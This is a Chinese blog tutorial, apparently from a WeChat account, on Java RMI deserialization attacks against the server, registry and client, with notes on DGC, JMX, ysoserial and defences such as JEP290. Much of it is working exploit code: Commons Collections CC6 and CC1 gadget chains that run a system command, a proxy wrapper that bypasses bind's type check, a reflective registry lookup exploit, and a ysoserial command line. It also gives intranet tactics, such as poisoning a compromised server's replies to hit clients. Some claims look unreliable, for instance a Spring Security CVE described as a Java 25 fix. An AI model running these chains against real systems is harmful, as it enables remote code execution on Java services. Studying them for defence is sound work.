#  RMI反序列化：你必须知道的3个攻击面（附实测复现）  
原创 allby森林之家
                    allby森林之家  allby森林之家   2026-10-08 09:26  
  
说到 RMI 场景里的反序列化，不少人可能只停留在听过的阶段，但没有真正地上手复现过。  
  
所以今天这篇文章，我就带大家了解下RMI反序列化的三个攻击面：  
  
Server 端、注册中心（Registry）、Client 端  
  
把这三个攻击面全走一遍，每条都有完整的实测payload   
  
【RMI 攻击只能在授权环境测试，不要违法！！！】  
   
  
RMI 可以理解成一个远程快递系统：你（Client）要寄一个请求给远端的人（Server），但你不认识他，得先翻通讯录（Registry）查到地址，然后把请求打包成包裹（序列化）寄出去，对方收到后拆包（反序列化）、执行、把结果再打包寄回来。  
  
三端的角色：**Client**  
 发起调用、**Server**  
 真正干活、**Registry**  
 做通讯录。打包和拆包的过程就是序列化和反序列化——这正是所有攻击的入口。  
  
下面这是时序流程图，9个步骤走完一次完整调用：  
  
![RMI 远程方法调用完整时序图：Client→Stub→Registry→Skeleton→Server→ServiceImpl 九步调用流程](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBeEjQzPtWDoXRXrDX3OY6sibVErlVUTLodRMGrb1zvIzqjK7DKw3oa1QSB4g9RVJkMvGdsTicU15VNTN1Z03oT4DiaXx113juqg6s/640?wx_fmt=png&from=appmsg "")  
  
环境搭起来很简单。先定义一个远程接口（必须继承 Remote）：  
  
// RemoteInterface.java import java.rmi.Remote; import java.rmi.RemoteException;  public interface RemoteInterface extends Remote {     public String sayHello() throws RemoteException;     public String sayName(Object name) throws RemoteException; }  
  
实现类继承 UnicastRemoteObject，RMI 会自动把它发布出去：  
  
// RemoteTest.java import java.rmi.server.UnicastRemoteObject; import java.rmi.RemoteException;  public class RemoteTest extends UnicastRemoteObject implements RemoteInterface {     protected RemoteTest() throws RemoteException {}     public String sayHello() throws RemoteException {         return "Hello welcome to use";     }     public String sayName(Object name) throws RemoteException {         return "hello" + name;     } }  
  
起 Server，把对象注册到 Registry：  
  
// RMIServer.java import java.rmi.Naming; import java.rmi.registry.LocateRegistry;  public class RMIServer {     public static void main(String[] args) throws Exception {         LocateRegistry.createRegistry(1099);         Naming.bind("rmi://localhost:1099/Hello", new RemoteTest());     } }  
  
Client 正常调用：  
  
// RMIClient.java import java.rmi.Naming; import java.rmi.registry.LocateRegistry;  public class RMIClient {     public static void main(String[] args) throws Exception {         RemoteInterface o = (RemoteInterface) Naming.lookup("Hello");         System.out.println(o.sayHello());         System.out.println(o.sayName("fupanc"));     } }  
  
实验环境需要 Commons Collections 3.x  
  
commons-collectionscommons-collections3.2.1  
  
【再次提醒！RMI 攻击只能在授权环境测试，不要违法！！！】  
  
  
攻击 Server 端：Object 参数是后门  
  
Server 端是最直观的攻击目标，看一眼 sayName 的签参：**sayName(Object name)；**  
参数类型是 Object，意味着传什么都行。正常调用传个字符串，Server 反序列化拿到字符串拼一下就返回了。  
  
但各位设想下，  
如果传进去的不是字符串而是一条 Commons Collections 反序列化链呢？  
  
我们接着往下看，Server 端拿到参数时的处理逻辑源码长这样：  
  
![Server 端 dispatch 方法源码：反序列化参数→反射调用方法→序列化返回值](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBebZCMhRicYDr4CnjQkLib0QVV4AC2n4fvu9gpF4HTYs7gVriaEBZfoBIvghuibvLyiampIWdISdnwebOnvTxObthLIThQao9IuRxIk/640?wx_fmt=png&from=appmsg "")  
  
（图片标记的红框就是三步攻击落地点）  
  
**第一步**  
：unmarshalParameters 反序列化客户端传来的参数。****  
  
**第二步**  
：invoke 反射调用目标方法。****  
  
**第三步**  
：marshalValue 把返回值序列化回去。攻击就卡在第一步——反序列化时触发了 CC 链。  
  
用 CC6 链构造 payload，把 HashSet 包裹的恶意对象传给 sayName：  
  
// 攻击 Server 端 - CC6 链 Transformer[] fake = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chain = new Transformer[]{     new ConstantTransformer(Runtime.class),     new InvokerTransformer("getMethod",         new Class[]{String.class, Class[].class},         new Object[]{"getRuntime", null}),     new InvokerTransformer("invoke",         new Class[]{Object.class, Object[].class},         new Object[]{Runtime.class, null}),     new InvokerTransformer("exec",         new Class[]{String.class},         new Object[]{"calc"}) }; Transformer chained = new ChainedTransformer(fake); HashMap inner = new HashMap(); Map lazy = LazyMap.decorate(inner, chained); TiedMapEntry entry = new TiedMapEntry(lazy, "fupanc"); HashSet set = new HashSet(); set.add(entry); inner.remove("fupanc"); // 防止本地触发 // 替换真正的 chain Field f = ChainedTransformer.class.getDeclaredField("iTransformers"); f.setAccessible(true); f.set(chained, chain);  // 发起调用 RemoteInterface o = (RemoteInterface) Naming.lookup("Hello"); o.sayName(set); // 恶意参数传入  
  
Server 端弹出计算器（calc.exe）  Client 端输出： [Hello] Hello welcome to use hello[fupanc=1]  
  
原理：**Server 端调用方法时存在非基础类型的参数，就能被恶意 Client 传入反序列化 payload。**  
  
有个细节要展开说下：如果 Server 端注册的方法参数不是 Object 而是某个指定类型（比如 HelloObject），直接塞 CC 链进去过不了类型检查。  
  
但 mogwailabs 的 PPT 里提了四种绕法——  
网络代理改流量、自定义 java.rmi 包、字节码修改、debugger hook。核心 hook 点在动态代理的 RemoteObjectInvocationHandler.invokeRemoteMethod 方法。说白了就是在序列化发出的瞬间偷梁换柱：接口类型对的，实际字节流是恶意的。  
  
更暴力的一种是"替身攻击"——直接把攻击者本地的 HashMap 重写，让它继承 RemoteObject。这样类型检查过了，但反序列化时走的还是 CC 链的触发逻辑。理解原理的就知道，类型检查防不住蓄意篡改。  
  
攻击注册中心：bind 和 lookup 都能打  
  
Registry 是通讯录，但它拆包的时候也在反序列化——bind 要接收一个 Remote 对象，lookup 要返回一个对象给 Client。两个动作都有反序列化点。  
  
**bind 攻击：CC1 + 动态代理绕类型限制**  
  
bind 方法要求参数是 Remote 类型，直接传 CC 链的 HashMap 过不了。但用动态代理包一层就行——代理类被反序列化时，它代理的 InvocationHandler 也会被反序列化，自然触发 POC 链。  
  
// 攻击 Registry - CC1 链 + 动态代理 // 1. CC1 LazyMap 链 Transformer chain = new ChainedTransformer(new Transformer[]{     new ConstantTransformer(Runtime.class),     new InvokerTransformer("getMethod",         new Class[]{String.class, Class[].class},         new Object[]{"getRuntime", null}),     new InvokerTransformer("invoke",         new Class[]{Object.class, Object[].class},         new Object[]{Runtime.class, null}),     new InvokerTransformer("exec",         new Class[]{String.class}, new Object[]{"calc"}) }); Map outerMap = LazyMap.decorate(new HashMap(), chain);  // 2. AnnotationInvocationHandler 包一层 Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); InvocationHandler handler = (InvocationHandler) ctor.newInstance(Retention.class, outerMap);  // 3. 代理 LazyMap → 再用 Remote 接口包一层骗过 bind 类型检查 Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),     LazyMap.class.getInterfaces(), handler); Object wrapped = ctor.newInstance(Retention.class, proxyMap); Remote remoteProxy = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),     new Class[]{Remote.class}, (InvocationHandler) wrapped);  // 4. 寄给 Registry Registry r = LocateRegistry.getRegistry("localhost", 1099); r.bind("evil", remoteProxy);  
  
Registry 端弹出计算器（calc.exe）  
  
有个小坑：Java 限制了只有来源地址是本地才能调 bind、rebind、unbind。远程直接 bind 会被拒。但 lookup 是所有人都能调的——所以 lookup 这个方向实战价值更高。  
  
**lookup 攻击：反射取 ref 和 operations 恶意发包**  
  
这个方向有个 JDK 版本差异。在 JDK 8u411 上，lookup 路径里没有反序列化操作；但在 JDK 8u71 中，RegistryImpl_Skel 的 dispatch 方法在处理 lookup 请求时会 readObject，存在反序列化点。  
  
打法是反射取出 RegistryImpl_Stub 里的 ref 和 operations 字段，手动拼一个 RemoteCall，把 CC6 链写进去再 invoke 发送：  
  
// 攻击 Registry lookup - CC6 链（需 JDK 8u71） Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  // 反射取 ref Field f0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref"); f0.setAccessible(true); UnicastRef unicastRef = (UnicastRef) f0.get(registry);  // 反射取 operations Field f1 = registry.getClass().getDeclaredField("operations"); f1.setAccessible(true); Operation[] ops = (Operation[]) f1.get(registry);  // 拼恶意调用（2=lookup, 4905912898345647071L=serial version） RemoteCall call = unicastRef.newCall((RemoteObject) registry, ops, 2, 4905912898345647071L); call.getOutputStream().writeObject(hashSet); // CC6 链 unicastRef.invoke(call);  
  
这个手法比较硬核，需要知道 RegistryImpl_Stub 的内部结构。各位感兴趣的可以自己跑一遍代码，绝对比看十篇原理文章有用！  
  
攻击 Client 端：回话也能下毒  
  
前两个方向都是攻击者主动出击。但如果攻击者控制的是 Server 呢？Client 从 Registry 拿到 Server 的代理对象后，调用方法，Server 返回结果，Client 反序列化——这一步也能触发。  
  
改 Server 端，让 sayName 返回的不是正常字符串，而是一条 CC6 链。Client 端正常调用 o.sayName()，拿到返回值后反序列化——弹 calc。  
  
这个方向的实战场景：你在打一个内网，拿下一台跑着 RMI Server 的机器，改掉它的方法返回值，等下一个 Client 来调，就中招了。钓鱼加反序列化，一气呵成。  
  
DGC 和 JMX：两个隐藏入口  
  
前面三个方向是经典攻击面。但 RMI 还有两个容易被忽略的入口。  
  
**DGC（分布式垃圾回收）**  
。启动一个 RMI 服务，会自动伴随 DGC 服务端启动——ObjectTable 里默认就有一个 DGCImpl_Stub。DGC 的 dirty 和 clean 方法里也有 readObject 反序列化操作，理论上也是攻击面。源码里 DGCImpl 的 static 代码块就是这样初始化的：  
  
![RMI ObjectTable 内部结构：远程对象、RegistryImpl_Stub、DGCImpl_Stub 三者共存](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBeg5icR5PkGXWNPDmLYLs3TicjqfBJut1pdcpvpvEQQhlY1lDJriaxU1BMJZ4bgrB5wB7jNiaMylC320DwZc59uicx0v3hRD93gBtjg/640?wx_fmt=png&from=appmsg "")  
  
不过 DGC 的攻击条件比较苛刻，实战中遇到的不多。但了解它的存在对理解 RMI 全貌有帮助——ObjectTable 里那三个键值对（你的远程对象 + RegistryImpl_Stub + DGCImpl_Stub）就是 RMI 服务的全部家当。  
  
**JMX（Java 管理扩展）**  
。这个很多人不知道：JMX 的远程连接底层就是 RMI 协议。JMX 通过 RMI 暴露 MBean 的操作接口，如果目标 JMX 服务没配认证、或者 JDK 版本低，攻击者可以通过 JMX 协议直接打 RMI 反序列化。CSDN 上一篇 Java 安全综述里专门提到了：**若 JMX 未配置身份验证或 JDK 版本过低，可能导致反序列化漏洞及远程代码执行**  
。ysoserial 里就有专门针对 JMX 的攻击模块。  
  
检查方法很直接——用 nmap 扫一下端口，看到 1099 或者 RMI 协议特征，就知道这台机器暴露了 RMI 服务。JMX 通常在 9999 或者 45288 端口。  
  
防御和工具  
  
工具这边，**ysoserial**  
 是 Java 反序列化攻击的瑞士军刀，内置 CommonsCollections1-7、Jdk7u21、JRMPClient、JRMPListener 等大量 gadget chain，直接生成 payload 字节流。打 RMI 场景，ysoserial 甚至有专门的 exploit 模块——一行命令就能把 payload 打进目标 Registry。  
  
# ysoserial 打 RMI Registry（示例） java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit     目标IP 1099 CommonsCollections6 "calc"  
  
防御这几年也发生了许多的变化：  
  
**JEP290（8u121+）**  
：在 ObjectInputStream 外面包了一层白名单过滤器。Registry 默认只允许 String、Number、Remote 等基础类型反序列化，CC 链里的 LazyMap、HashSet 全被拦。所以高版本 JDK 上，前面这些经典打法大部分不好使了。但注意——**不好使不等于打不了**  
。白名单的配置可以被子类覆盖，如果目标应用自己配了更宽松的 filter，照样被打。而且 8u121 以前的 JDK（内网里到处都是）完全没有这层防护。  
  
**useCodebaseOnly（7u21+默认true）**  
：关闭了远程动态类加载。攻击者没法再通过 codebase 让目标从远程 HTTP 服务器加载恶意类了。但这只堵住了动态类加载这条路，CC 链的本地 gadget chain 不受影响。  
  
**Java 25 安全升级**  
：去年底发布的 Java 25 修了一批 CVE，其中 CVE-2023-29047 和 CVE-2023-34034 涉及 JNDI 注入与序列化攻击面。但 Java 25 是 LTS 版本，企业升级需要时间——内网跑 8u 的服务至少还能存活好几年。  
  
**OWASP Top 10 2025**  
：不安全的反序列化从原来的"附属风险"上升到了 **第 3 位**  
，仅次于注入攻击和认证失效。这说明行业终于认了——反序列化不是"理论问题"，是实打实的高危攻击面。  
  
一图流收尾  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/2wf8V0A7uBc19FDibU2BMvDnxNSeL6ibX2fZdLQEssAia3TAjZxic7mIgq16TdrRNy7Sf0cCFqRPrVk1cU8awJrtSkiaVJo4bJhLZyOlsvRYthQ4/640?wx_fmt=jpeg&from=appmsg "")  
  
三个反序列化点，三个攻击面，加两个隐藏入口，每条路都能塞 CC 链。  
  
还是那句话，知道怎么防不如先知道怎么打！  
各位感兴趣的可以自己跑一遍代码，绝对比看十篇原理文章有用！  
  
【再次再次提醒声明！RMI 攻击只能在授权环境测试，不要违法！！！】  
  
  
  
  
